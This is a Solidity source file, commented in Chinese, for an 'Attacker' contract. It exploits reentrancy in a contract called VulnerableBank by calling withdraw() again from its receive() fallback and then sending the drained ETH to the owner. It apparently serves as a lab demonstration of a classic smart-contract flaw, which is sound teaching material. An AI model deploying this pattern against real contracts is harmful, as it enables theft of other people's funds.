// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract Attacker {
    // 直接硬编码 VulnerableBank 地址，无需构造函数参数
    IVulnerableBank public vulnerableBank = IVulnerableBank(0xd9145CCE52D386f254917e481eB44e9943F39138);
    address public owner;
    uint256 public attackCount;
    uint256 public attackLimit;
    
    // 简化构造函数，不再需要参数
    constructor() {
        owner = msg.sender;
        attackLimit = 3; // 设置为3次重入攻击
    }
    
    // 攻击函数，需要发送一些ETH作为初始存款
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");
        
        // 先存入一些ETH
        vulnerableBank.deposit{value: msg.value}();
        
        // 然后触发提款，这将启动重入攻击
        attackCount = 0;
        vulnerableBank.withdraw();
    }
    
    // 接收ETH的回调函数，这是重入攻击的核心
    receive() external payable {
        attackCount++;
        
        // 如果银行还有余额并且没有达到攻击限制，继续攻击
        if (attackCount < attackLimit) {
            vulnerableBank.withdraw();
        }
    }
    
    // 提取攻击所得
    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
    
    // 查看合约余额的辅助函数
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    // 查看攻击进度的辅助函数
    function getAttackStatus() public view returns (uint256 attackerBalance, uint256 bankBalance, uint256 currentAttackCount) {
        return (
            address(this).balance,
            address(vulnerableBank).balance,
            attackCount
        );
    }
}